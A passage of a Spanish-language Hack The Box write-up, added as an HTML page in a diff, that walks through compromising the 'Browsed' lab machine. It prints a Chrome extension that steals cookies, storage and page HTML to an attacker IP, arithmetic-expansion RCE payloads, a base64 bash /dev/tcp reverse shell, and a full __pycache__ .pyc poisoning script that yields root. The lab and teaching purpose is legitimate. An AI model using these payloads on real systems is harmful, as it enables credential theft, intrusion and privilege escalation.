+                <p>El service worker de fondo se ejecuta cuando se instala la extensión y exfiltra todas las cookies del navegador. También tiene un listener de <code>tabs.onUpdated</code>, pero este no se disparará en este escenario concreto ya que el bot de HTB no usa los tabs de manera que se active el evento:</p>
+                <pre data-lang="javascript"><code>chrome.runtime.<span class="func">onInstalled</span>.<span class="func">addListener</span>(() => {
+  console.<span class="func">log</span>(<span class="str">'Extension installed'</span>);
+
+  chrome.cookies.<span class="func">getAll</span>({}, (cookies) => {
+    <span class="kw">const</span> cookieData = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>(cookies));
+    <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=cookies&amp;data=</span><span class="var">${cookieData}</span><span class="str">`</span>)
+      .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+  });
+});
+
+chrome.tabs.<span class="func">onUpdated</span>.<span class="func">addListener</span>((tabId, changeInfo, tab) => {
+  <span class="kw">if</span> (changeInfo.status === <span class="str">'complete'</span> && tab.url) {
+    chrome.scripting.<span class="func">executeScript</span>({
+      target: { tabId: tabId },
+      function: exfiltrateData
+    });
+  }
+});
+
+<span class="kw">function</span> <span class="func">exfiltrateData</span>() {
+  <span class="kw">const</span> data = {
+    url: window.location.href,
+    cookies: document.cookie,
+    localStorage: JSON.<span class="func">stringify</span>(localStorage),
+    sessionStorage: JSON.<span class="func">stringify</span>(sessionStorage),
+    html: document.documentElement.outerHTML.<span class="func">substring</span>(<span class="num">0</span>, <span class="num">5000</span>)
+  };
+  <span class="kw">const</span> encodedData = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>(data));
+  <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=pagedata&amp;data=</span><span class="var">${encodedData}</span><span class="str">`</span>)
+    .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+}</code></pre>
+
+                <h2>Descubrimiento de la Instancia Interna de Gitea</h2>
+                <p>Comprimo la extensión en un <code>.zip</code>, me pongo en escucha con Python por el puerto 8000 para capturar los datos exfiltrados, y subo la extensión. Al poco tiempo recibo callbacks con el contenido de una web y sus cookies. Los datos exfiltrados de cookies revelan un dominio que no conocía y una instancia de Gitea (versión 1.24.5):</p>
+                <pre data-lang="json"><code>[
+  {
+    <span class="str">"domain"</span>: <span class="str">"browsedinternals.htb"</span>,
+    <span class="str">"hostOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"httpOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"name"</span>: <span class="str">"i_like_gitea"</span>,
+    <span class="str">"path"</span>: <span class="str">"/"</span>,
+    <span class="str">"sameSite"</span>: <span class="str">"lax"</span>,
+    <span class="str">"secure"</span>: <span class="kw">false</span>,
+    <span class="str">"session"</span>: <span class="kw">true</span>,
+    <span class="str">"storeId"</span>: <span class="str">"0"</span>,
+    <span class="str">"value"</span>: <span class="str">"676e92f7569d276e"</span>
+  },
+  {
+    <span class="str">"domain"</span>: <span class="str">"browsedinternals.htb"</span>,
+    <span class="str">"expirationDate"</span>: <span class="num">1768645920.977966</span>,
+    <span class="str">"hostOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"httpOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"name"</span>: <span class="str">"_csrf"</span>,
+    <span class="str">"path"</span>: <span class="str">"/"</span>,
+    <span class="str">"sameSite"</span>: <span class="str">"lax"</span>,
+    <span class="str">"secure"</span>: <span class="kw">false</span>,
+    <span class="str">"session"</span>: <span class="kw">false</span>,
+    <span class="str">"storeId"</span>: <span class="str">"0"</span>,
+    <span class="str">"value"</span>: <span class="str">"r6E_bV0oE45umR9BfQxG95TuANE6MTc2ODU1OTUyMDk2ODcyOTM3MQ"</span>
+  }
+]</code></pre>
+
+                <p>Añado <code>browsedinternals.htb</code> al <code>/etc/hosts</code> y visito la instancia de Gitea. Allí encuentro un repositorio llamado <code>larry/MarkdownPreview</code> que contiene una aplicación web en Flask (<code>app.py</code>), un script bash (<code>routines.sh</code>), y algunos archivos de logs y backups HTML que no parecen ser de utilidad.</p>
+
+                <p>El archivo <code>markdown.md</code> del repositorio contiene esta nota:</p>
+                <blockquote>
+                    <p># markdownPreview<br>This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!</p>
+                </blockquote>
+
+                <p>Esta información es clave — la aplicación está corriendo localmente en el puerto 5000. A partir de aquí entiendo la idea: dado que la extensión de Chrome se ejecuta en el contexto del navegador del bot (que tiene acceso a <code>127.0.0.1</code>), puedo usar la extensión para hacer peticiones a esta aplicación Flask que solo corre en local.</p>
+
+                <h2>Análisis del Código - RCE por Expansión Aritmética</h2>
+                <p>Revisando el código del repositorio, encuentro una vulnerabilidad crítica. En <code>routines.sh</code> hay comparaciones como esta:</p>
+                <pre data-lang="bash"><code><span class="kw">if</span> [[ <span class="str">"$1"</span> <span class="flag">-eq</span> <span class="num">0</span> ]]; <span class="kw">then</span></code></pre>
+
+                <p>Este tipo de comparaciones con <code>-eq</code> dentro de <code>[[ ]]</code> son peligrosas porque son vulnerables a ejecución de código mediante <strong>expansión aritmética</strong>. Si puedo controlar el primer argumento y enviarlo como <code>x[$(id)]</code>, al expandirse la variable se ejecutará el comando <code>id</code>.</p>
+
+                <p>En <code>app.py</code> encuentro la ruta que llama a este script:</p>
+                <pre data-lang="python"><code><span class="op">@</span>app.<span class="func">route</span>(<span class="str">'/routines/&lt;rid&gt;'</span>)
+<span class="kw">def</span> <span class="func">routines</span>(rid):
+    <span class="cm"># Call the script that manages the routines</span>
+    <span class="cm"># Run bash script with the input as an argument (NO shell)</span>
+    subprocess.<span class="func">run</span>([<span class="str">"./routines.sh"</span>, rid])
+    <span class="kw">return</span> <span class="str">"Routine executed !"</span></code></pre>
+
+                <p>Por lo tanto, puedo controlar el primer argumento mediante el parámetro <code>&lt;rid&gt;</code> de la URL. Aunque <code>subprocess.run</code> se usa sin <code>shell=True</code>, el propio script bash realizará la expansión aritmética al evaluar la comparación con <code>-eq</code>.</p>
+
+                <h2>Acceso Inicial - RCE mediante Expansión Aritmética</h2>
+                <h3>Prueba de Concepto</h3>
+                <p>Para demostrar el RCE, creo una nueva extensión con este <code>content.js</code> que hace que el navegador del bot solicite el endpoint vulnerable de Flask con un payload codificado en URL:</p>
+                <pre data-lang="javascript"><code>(<span class="kw">function</span>() {
+  <span class="func">fetch</span>(<span class="str">`http://127.0.0.1:5000/routines/x%5B%24(curl%2010.10.14.172)%5D`</span>)
+    .<span class="func">catch</span>(e => <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000?data=</span><span class="var">${e}</span><span class="str">`</span>));
+})();</code></pre>
+
+                <p>En este caso quito la parte del <code>eventListener</code> de submit de forms ya que no se usará de todos modos. La parte clave de este código es el URL encoding después de <code>/routines/</code>:</p>
+                <pre data-lang="plaintext"><code>x%5B%24(curl%2010.10.14.172)%5D</code></pre>
+
+                <p>Sin URL encoding queda como <code>x[$(curl 10.10.14.172)]</code>, un simple check a mi IP para demostrar RCE. Me pongo en escucha por los puertos 80 y 8000, envío la extensión con este código y recibo la petición en el puerto 80, lo que confirma que la máquina víctima ha ejecutado el <code>curl</code>:</p>
+                <pre data-lang="plaintext"><code>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.1.175 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <h3>Reverse Shell</h3>
+                <p>Ahora que sé que tengo RCE, voy a enviarme una reverse shell. Para evitar líos de URL encoding, voy a usar base64 para codificar el payload:</p>
+                <pre data-lang="bash"><code><span class="cmd">echo</span> <span class="str">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.172/443 0&gt;&amp;1"'</span> | <span class="cmd">base64</span></code></pre>
+                <pre data-lang="plaintext"><code>YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzIvNDQzIDA+JjEiCg==</code></pre>
+
+                <p>Una vez tengo esta cadena en base64, lo único que necesito es que la máquina víctima ejecute este comando:</p>
+                <pre data-lang="bash"><code><span class="cmd">echo</span> <span class="str">"YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzIvNDQzIDA+JjEiCg=="</span> | <span class="cmd">base64</span> <span class="flag">-d</span> | <span class="cmd">bash</span></code></pre>
+
+                <p>Para eso envío este payload en <code>content.js</code>:</p>
+                <pre data-lang="javascript"><code>(<span class="kw">function</span>() {
+  <span class="func">fetch</span>(<span class="str">`http://127.0.0.1:5000/routines/x%5B%24(echo%20%22YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzIvNDQzIDA%2BJjEiCg%3D%3D%22%20%7C%20base64%20-d%20%7C%20bash)%5D`</span>)
+    .<span class="func">catch</span>(e => <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000?data=</span><span class="var">${e}</span><span class="str">`</span>));
+})();</code></pre>
+
+                <p>Al enviar la extensión, recibo una reverse shell como <code>larry</code>.</p>
+
+                <h2>Escalada de Privilegios - Envenenamiento de Caché __pycache__ .pyc</h2>
+                <p>Compruebo los privilegios sudo de <code>larry</code>:</p>
+                <pre data-lang="bash"><code>larry@browsed:~/markdownPreview$ <span class="cmd">sudo</span> <span class="flag">-l</span></code></pre>
+                <pre data-lang="plaintext"><code>Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py</code></pre>
+
+                <p>El usuario puede ejecutar <code>/opt/extensiontool/extension_tool.py</code> como root sin contraseña. Revisando el código de <code>extension_tool.py</code> y su dependencia <code>extension_utils.py</code>, no veo nada sospechoso de primeras.</p>
+
+                <p>Lo que me llama la atención es un directorio <code>__pycache__</code> con permisos globales a lo <code>/tmp</code>, es decir, cualquiera puede crear cualquier cosa dentro. Al ejecutar el script Python con sudo, se crea este archivo dentro de pycache:</p>
+                <pre data-lang="plaintext"><code>extension_utils.cpython-312.pyc</code></pre>
+
+                <h3>Entendiendo el Envenenamiento de __pycache__</h3>
+                <p>Cuando Python importa un módulo, lo compila a bytecode (archivos <code>.pyc</code>) almacenados en <code>__pycache__/</code>. Si este directorio tiene permisos de escritura global, es posible reemplazar estos archivos compilados con bytecode malicioso que se ejecuta cuando se importa el módulo.</p>
+
+                <p>Sin embargo, no es tan fácil como crear un archivo y listo — Python guarda cierta información del archivo cacheado que hay que tener en cuenta. Concretamente, el archivo <code>.pyc</code> malicioso debe tener exactamente el <strong>mismo tamaño de archivo</strong> y el <strong>mismo timestamp</strong> que el fichero <code>.py</code> fuente original.</p>
+
+                <h3>Creación del Exploit</h3>
+                <p>Teniendo todo esto en cuenta, creo un script Python que copia el archivo original <code>extension_utils.py</code> pero inyecta un comando que crea una copia SUID de <code>/bin/bash</code>. Para mantener exactamente el mismo tamaño de archivo, acorta un comentario de tipo docstring para compensar por el tamaño extra del payload. También modifica el timestamp del archivo para que coincida con el del original, luego lo compila y coloca el <code>.pyc</code> resultante en el directorio <code>__pycache__</code> vulnerable:</p>
+                <pre data-lang="python"><code><span class="kw">import</span> os
+<span class="kw">import</span> py_compile
+
+<span class="var">ORIGINAL_PY</span> = <span class="str">'/opt/extensiontool/extension_utils.py'</span>
+<span class="var">TEMP_PY</span> = <span class="str">'/tmp/extension_utils.py'</span>
+<span class="var">TARGET_PYC</span> = <span class="str">'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'</span>
+
+orig_stat = os.<span class="func">stat</span>(<span class="var">ORIGINAL_PY</span>)
+orig_size = orig_stat.st_size
+orig_mtime = orig_stat.st_mtime
+
+<span class="kw">with</span> <span class="func">open</span>(<span class="var">ORIGINAL_PY</span>, <span class="str">'r'</span>) <span class="kw">as</span> f:
+    original = f.<span class="func">read</span>()
+
+<span class="cm"># Replace the long docstring with a shorter one</span>
+modified = original.<span class="func">replace</span>(
+    <span class="str">'""" Clean up temporary files or unnecessary directories after packaging """'</span>,
+    <span class="str">'""" Clean """'</span>
+)
+
+<span class="cm"># Add our payload after imports</span>
+payload = <span class="str">"os.system('cp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash')\n"</span>
+lines = modified.<span class="func">split</span>(<span class="str">'\n'</span>)
+<span class="kw">for</span> i, line <span class="kw">in</span> <span class="func">enumerate</span>(lines):
+    <span class="kw">if</span> line.<span class="func">strip</span>().<span class="func">startswith</span>(<span class="str">'from jsonschema'</span>):
+        lines.<span class="func">insert</span>(i + <span class="num">1</span>, payload.<span class="func">rstrip</span>())
+        <span class="kw">break</span>
+modified = <span class="str">'\n'</span>.<span class="func">join</span>(lines)
+
+<span class="cm"># Adjust to exact size</span>
+current = <span class="func">len</span>(modified.<span class="func">encode</span>(<span class="str">'utf-8'</span>))
+<span class="kw">if</span> current > orig_size:
+    modified = modified[:-(current - orig_size)]
+<span class="kw">elif</span> current < orig_size:
+    modified += <span class="str">' '</span> * (orig_size - current)
+
+<span class="kw">with</span> <span class="func">open</span>(<span class="var">TEMP_PY</span>, <span class="str">'w'</span>) <span class="kw">as</span> f:
+    f.<span class="func">write</span>(modified)
+
+os.<span class="func">utime</span>(<span class="var">TEMP_PY</span>, (orig_mtime, orig_mtime))
+
+<span class="cm"># Verify</span>
+<span class="kw">if</span> os.<span class="func">stat</span>(<span class="var">TEMP_PY</span>).st_size == orig_size:
+    <span class="func">print</span>(<span class="str">f"[+] Size matched: {orig_size} bytes"</span>)
+    py_compile.<span class="func">compile</span>(<span class="var">TEMP_PY</span>, cfile=<span class="var">TARGET_PYC</span>, doraise=<span class="kw">True</span>)
+    <span class="func">print</span>(<span class="str">"[+] Exploit ready!"</span>)
+<span class="kw">else</span>:
+    <span class="func">print</span>(<span class="str">f"[!] Size mismatch: {os.<span class="func">stat</span>(<span class="var">TEMP_PY</span>).st_size} vs {orig_size}"</span>)</code></pre>
+
+                <h3>Ejecutando la Escalada de Privilegios</h3>
+                <p>Ejecuto el script del exploit:</p>
+                <pre data-lang="bash"><code>larry@browsed:/tmp$ <span class="cmd">python3</span> xd.py
+<span class="str">[+] Size matched: 1245 bytes</span>
+<span class="str">[+] Exploit ready!</span></code></pre>
+
+                <p>Ahora ejecuto el comando sudo, lo que desencadena la importación del módulo <code>extension_utils</code> envenenado. Se crea la copia SUID de bash:</p>
+                <pre data-lang="plaintext"><code>-rwsr-xr-x 1 root root 1.4M rootbash</code></pre>
+
+                <p>Finalmente, ejecuto la bash SUID para obtener una shell como root:</p>
+                <pre data-lang="bash"><code>larry@browsed:/tmp$ ./<span class="cmd">rootbash</span> <span class="flag">-p</span>
+rootbash-5.2#</code></pre>
+
+                <p>Acceso root conseguido. Máquina completada.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
